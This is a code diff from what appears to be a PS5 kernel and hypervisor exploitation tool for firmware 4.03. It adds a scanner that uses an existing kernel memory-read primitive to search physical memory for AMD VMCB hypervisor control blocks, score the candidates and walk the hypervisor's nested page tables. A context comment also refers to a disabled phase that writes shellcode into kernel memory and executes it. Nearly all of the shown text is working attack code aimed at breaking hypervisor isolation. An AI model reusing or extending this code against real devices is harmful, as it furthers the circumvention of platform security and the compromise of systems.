@@ -2816,6 +2816,254 @@ int main(void) {
     /* Verify known offsets on 4.03 */
     verify_kstuff_offsets();
 
+    /* ── VMCB Scanner: Find HV control structures in physical memory ──
+     *
+     * Scans guest-accessible physical memory for AMD VMCB (Virtual Machine
+     * Control Block) structures. The VMCB contains the NPT root (nCR3)
+     * which is the key to understanding the hypervisor's memory mapping.
+     *
+     * Safety: Previous versions caused kernel panics by reading MMIO regions
+     * via DMAP. This version probes 2MB regions first and skips any that
+     * fail, avoiding machine check exceptions from MMIO space.
+     *
+     * VMCB layout (AMD APM Vol 2, Table 15-1):
+     *   0x000-0x3FF: Control area (intercepts, IOPM/MSRPM base, nCR3, etc.)
+     *   0x400-0x5FF: Save state area (guest register snapshot)
+     *     0x548: LSTAR MSR
+     *     0x550: EFER MSR
+     *     0x578: CR4
+     *     0x580: CR3
+     *     0x588: CR0
+     *   0x600-0xFFF: Reserved / implementation-specific
+     */
+    {
+        printf("\n=============================================\n");
+        printf("  VMCB Scanner: HV Structure Discovery\n");
+        printf("=============================================\n\n");
+        fflush(stdout);
+
+        /* Scan range: 0 to 2GB. Physical memory beyond this is unlikely
+         * to contain HV structures on PS5 (4GB total, upper half is MMIO). */
+        uint64_t scan_end = 0x80000000ULL; /* 2GB */
+
+        printf("[*] Scan range: PA 0x0 → 0x%lx (%luMB)\n",
+               (unsigned long)scan_end, (unsigned long)(scan_end >> 20));
+        printf("    Guest CR3 = 0x%lx\n", (unsigned long)g_cr3_phys);
+        printf("    ktext     = 0x%lx\n", (unsigned long)g_ktext_base);
+        printf("    kdata     = 0x%lx\n", (unsigned long)g_kdata_base);
+        fflush(stdout);
+
+        uint8_t scan_pg[4096];
+        int pages_ok = 0, pages_skip = 0;
+        int regions_ok = 0, regions_skip = 0;
+
+        /* Best candidates */
+        #define VMCB_MAX_CANDIDATES 32
+        struct vmcb_candidate {
+            uint64_t pa;
+            int score;
+            uint64_t cr3, cr0, cr4, efer, lstar;
+            uint64_t intercept_lo, intercept_hi;
+            uint64_t ncr3;
+        } candidates[VMCB_MAX_CANDIDATES];
+        int num_candidates = 0;
+
+        for (uint64_t pa = 0; pa < scan_end; pa += 0x1000) {
+            /* Probe at 2MB boundaries: test first page of each region.
+             * If the probe fails (MMIO/reserved), skip the entire 2MB. */
+            if ((pa & 0x1FFFFF) == 0) {
+                if (kernel_copyout(g_dmap_base + pa, scan_pg, 8) != 0) {
+                    regions_skip++;
+                    pages_skip += 512;
+                    pa += 0x1FFFFF; /* skip to next 2MB boundary */
+                    continue;
+                }
+                regions_ok++;
+
+                /* Progress every 64MB */
+                if ((pa & 0x3FFFFFF) == 0 && pa > 0) {
+                    printf("    %luMB/%luMB scanned (%d pages OK, "
+                           "%d regions skipped)\r",
+                           (unsigned long)(pa >> 20),
+                           (unsigned long)(scan_end >> 20),
+                           pages_ok, regions_skip);
+                    fflush(stdout);
+                }
+            }
+
+            if (kernel_copyout(g_dmap_base + pa, scan_pg, 4096) != 0) {
+                pages_skip++;
+                continue;
+            }
+            pages_ok++;
+
+            /* ── Quick reject: check CR3 at offset 0x580 ── */
+            uint64_t v_cr3 = 0;
+            memcpy(&v_cr3, scan_pg + 0x580, 8);
+
+            /* CR3 must match our known guest CR3 (mask low 12 bits = PCID) */
+            if (g_cr3_phys == 0) continue;
+            if ((v_cr3 & ~0xFFFULL) != (g_cr3_phys & ~0xFFFULL)) continue;
+            if (v_cr3 == 0) continue;
+
+            /* ── Reject pages filled with a repeated value ──
+             * The 0xffffffffd28437b8 pattern: slab allocator free-list pages
+             * where every qword is the same kernel pointer. If offset 0x580
+             * happens to match CR3, it's a false positive. Check if many
+             * surrounding qwords are identical. */
+            {
+                int repeats = 0;
+                for (int off = 0x560; off <= 0x5A0; off += 8) {
+                    uint64_t val;
+                    memcpy(&val, scan_pg + off, 8);
+                    if (val == v_cr3) repeats++;
+                }
+                if (repeats >= 6) continue; /* 6+ of 9 qwords identical = slab page */
+            }
+
+            /* ── Score this VMCB candidate ── */
+            int score = 0;
+
+            /* Read save-state fields */
+            uint64_t v_cr0 = 0, v_cr4 = 0, v_efer = 0, v_lstar = 0;
+            memcpy(&v_cr0,   scan_pg + 0x588, 8);
+            memcpy(&v_cr4,   scan_pg + 0x578, 8);
+            memcpy(&v_efer,  scan_pg + 0x550, 8);
+            memcpy(&v_lstar, scan_pg + 0x548, 8);
+
+            /* Read control area fields */
+            uint64_t v_intercept_lo = 0, v_intercept_hi = 0;
+            uint64_t v_ncr3 = 0;
+            memcpy(&v_intercept_lo, scan_pg + 0x00, 8); /* intercept_cr reads/writes */
+            memcpy(&v_intercept_hi, scan_pg + 0x0C, 4); /* intercept vector 2 */
+            memcpy(&v_ncr3, scan_pg + 0x90, 8);         /* nCR3 (NPT root) at 0x90 */
+
+            /* Score: CR3 match (already confirmed) */
+            score += 20;
+
+            /* Score: CR0 should have PE(0), PG(31), NE(5) set */
+            if ((v_cr0 & 0x80000021ULL) == 0x80000021ULL) score += 15;
+            else if (v_cr0 == 0 || v_cr0 == v_cr3) score -= 10;
+
+            /* Score: CR4 should have PAE(5) set, reasonable value */
+            if (v_cr4 & (1ULL << 5)) score += 10;
+            if (v_cr4 == 0 || v_cr4 == v_cr3) score -= 10;
+
+            /* Score: EFER should have LME(8), LMA(10), SCE(0) set */
+            if ((v_efer & 0x501ULL) == 0x501ULL) score += 15;
+            else if (v_efer == 0 || v_efer == v_cr3) score -= 10;
+
+            /* Score: LSTAR should be in ktext range */
+            if (v_lstar >= g_ktext_base &&
+                v_lstar < g_ktext_base + 0x2000000 &&
+                (v_lstar & 0x3) == 0) {
+                score += 25; /* Very strong signal */
+            } else if (v_lstar == 0 || v_lstar == v_cr3) {
+                score -= 10;
+            }
+
+            /* Score: intercepts should be non-zero (HV intercepts something) */
+            if (v_intercept_lo != 0) score += 5;
+            if (v_intercept_hi != 0) score += 5;
+
+            /* Score: nCR3 should be page-aligned, non-zero, reasonable PA */
+            if (v_ncr3 != 0 && (v_ncr3 & 0xFFF) == 0 &&
+                v_ncr3 < 0x800000000ULL) {
+                score += 10;
+                /* Bonus: nCR3 page is readable (guest can access NPT root) */
+                uint8_t probe[8];
+                if (kernel_copyout(g_dmap_base + v_ncr3, probe, 8) == 0) {
+                    score += 5;
+                }
+            }
+
+            /* Minimum threshold to report */
+            if (score < 30) continue;
+
+            printf("\n[!] VMCB candidate at PA 0x%lx (score=%d)\n",
+                   (unsigned long)pa, score);
+            printf("    CR3(0x580)  = 0x%016lx\n", (unsigned long)v_cr3);
+            printf("    CR0(0x588)  = 0x%016lx\n", (unsigned long)v_cr0);
+            printf("    CR4(0x578)  = 0x%016lx\n", (unsigned long)v_cr4);
+            printf("    EFER(0x550) = 0x%016lx\n", (unsigned long)v_efer);
+            printf("    LSTAR(0x548)= 0x%016lx", (unsigned long)v_lstar);
+            if (v_lstar >= g_ktext_base &&
+                v_lstar < g_ktext_base + 0x2000000) {
+                printf(" (ktext+0x%lx)",
+                       (unsigned long)(v_lstar - g_ktext_base));
+            }
+            printf("\n");
+            printf("    nCR3(0x90)  = 0x%016lx\n", (unsigned long)v_ncr3);
+            printf("    Intercepts  = lo:0x%lx hi:0x%lx\n",
+                   (unsigned long)v_intercept_lo,
+                   (unsigned long)v_intercept_hi);
+            fflush(stdout);
+
+            /* Store candidate */
+            if (num_candidates < VMCB_MAX_CANDIDATES) {
+                struct vmcb_candidate *c = &candidates[num_candidates++];
+                c->pa = pa;
+                c->score = score;
+                c->cr3 = v_cr3;
+                c->cr0 = v_cr0;
+                c->cr4 = v_cr4;
+                c->efer = v_efer;
+                c->lstar = v_lstar;
+                c->intercept_lo = v_intercept_lo;
+                c->intercept_hi = v_intercept_hi;
+                c->ncr3 = v_ncr3;
+            }
+        }
+
+        printf("\n\n[*] VMCB scan summary:\n");
+        printf("    Pages: %d OK, %d skipped\n", pages_ok, pages_skip);
+        printf("    2MB regions: %d accessible, %d skipped (MMIO)\n",
+               regions_ok, regions_skip);
+        printf("    Candidates: %d (score >= 30)\n", num_candidates);
+
+        if (num_candidates > 0) {
+            /* Find best candidate */
+            int best_idx = 0;
+            for (int i = 1; i < num_candidates; i++) {
+                if (candidates[i].score > candidates[best_idx].score)
+                    best_idx = i;
+            }
+            struct vmcb_candidate *best = &candidates[best_idx];
+
+            printf("\n[+] Best VMCB candidate: PA 0x%lx (score=%d)\n",
+                   (unsigned long)best->pa, best->score);
+
+            /* If nCR3 is valid, try to walk the NPT */
+            if (best->ncr3 != 0 && (best->ncr3 & 0xFFF) == 0 &&
+                best->ncr3 < 0x800000000ULL) {
+                printf("\n[*] NPT walk from nCR3 = 0x%lx:\n",
+                       (unsigned long)best->ncr3);
+
+                /* Read first few PML4 entries of the NPT */
+                uint64_t npt_pml4[8];
+                if (kernel_copyout(g_dmap_base + best->ncr3,
+                                   npt_pml4, sizeof(npt_pml4)) == 0) {
+                    for (int i = 0; i < 8; i++) {
+                        if (npt_pml4[i] & 1) {
+                            printf("    NPT PML4[%d] = 0x%016lx → PA 0x%lx %s%s\n",
+                                   i, (unsigned long)npt_pml4[i],
+                                   (unsigned long)(npt_pml4[i] & PTE_PA_MASK),
+                                   (npt_pml4[i] & 2) ? "RW " : "RO ",
+                                   (npt_pml4[i] >> 63) ? "NX" : "X");
+                        }
+                    }
+                } else {
+                    printf("    nCR3 page NOT readable from guest\n");
+                }
+            }
+        } else {
+            printf("\n[*] No VMCB candidates found.\n");
+            printf("    HV structures likely in guest-inaccessible memory.\n");
+        }
+        printf("\n");
+        fflush(stdout);
+    }
+
     /* Phase 1: TF trace xapic_mode
      *
      * DISABLED: The TF trace writes shellcode to DMAP and tries to execute
